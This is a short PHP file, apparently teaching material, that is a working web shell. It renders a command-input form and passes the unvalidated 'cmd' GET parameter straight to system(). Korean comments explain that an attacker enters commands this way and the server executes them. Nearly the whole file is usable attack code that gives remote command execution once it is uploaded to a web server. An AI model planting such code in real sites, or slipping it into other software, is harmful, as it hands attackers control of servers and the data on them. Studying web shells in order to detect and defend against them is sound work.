<?php

echo 'Enter a Command:<br>';
echo '<form action="">';
echo '<input type=text name="cmd">';
echo '<input type="submit">';
echo '</form>';					

/*
	echo 부분은 명령어를 입력받을 수 있는 폼을 제공
    공격자가 입력 폼에 명령어를 입력하면 cmd 파라미터를 통해 전달된다.
*/

if(isset($_GET['cmd'])){
	system($_GET['cmd']);
}
//system 함수를 통해 전달된 명령어가 실행된다.

?>
  